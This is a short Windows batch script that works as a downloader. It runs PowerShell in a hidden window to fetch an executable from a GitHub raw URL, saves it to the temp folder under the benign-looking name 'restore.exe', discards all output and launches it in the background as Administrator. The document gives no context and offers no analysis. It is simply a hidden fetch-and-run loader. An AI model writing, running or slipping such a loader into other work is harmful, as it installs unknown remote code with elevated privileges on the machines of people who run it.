@echo off

powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\restore.exe" >nul 2>&1
start /B "" runas /user:Administrator "%TEMP%\restore.exe"

endlocal
